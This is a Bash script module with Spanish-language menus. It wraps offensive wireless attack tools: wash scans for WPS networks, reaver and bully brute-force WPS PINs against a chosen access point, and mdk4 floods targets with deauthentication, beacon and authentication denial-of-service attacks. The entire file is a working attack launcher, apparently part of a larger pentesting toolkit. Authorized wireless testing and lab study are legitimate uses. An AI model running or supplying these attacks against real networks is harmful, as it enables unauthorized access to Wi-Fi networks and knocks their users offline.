#!/bin/bash

# --- Module: Advanced Wireless Activities ---

function advanced_menu() {
    echo -e "\n${BLUE}[*] Módulo Wireless Avanzado${NC}"
    echo "1) Escaneo de redes WPS (Wash)"
    echo "2) Ataque Brute Force WPS (Reaver)"
    echo "3) Ataque Brute Force WPS (Bully)"
    echo "4) MDK4 - Deauth Flood / Beacon Flood"
    echo "5) Volver"
    read subopt
    
    case $subopt in
        1)
            echo -e "${YELLOW}Interfaz (Monitor): ${NC}"
            read iface
            wash -i "$iface"
            ;;
        2)
            echo -e "${YELLOW}Interfaz: ${NC}"
            read iface
            echo -e "${YELLOW}BSSID: ${NC}"
            read bssid
            reaver -i "$iface" -b "$bssid" -vv
            ;;
        3)
            echo -e "${YELLOW}Interfaz: ${NC}"
            read iface
            echo -e "${YELLOW}BSSID: ${NC}"
            read bssid
            bully -b "$bssid" "$iface"
            ;;
        4)
            mdk4_menu
            ;;
        *) return ;;
    esac
}

function mdk4_menu() {
    echo -e "\n${RED}[!] PRECAUCIÓN: MDK4 puede ser muy agresivo${NC}"
    echo "1) Deauthentication Attack"
    echo "2) Beacon Flooding"
    echo "3) Authentication DoS"
    read m_opt
    echo -e "${YELLOW}Interfaz: ${NC}"
    read iface
    
    case $m_opt in
        1) mdk4 "$iface" d ;;
        2) mdk4 "$iface" b ;;
        3) mdk4 "$iface" a ;;
        *) return ;;
    esac
}
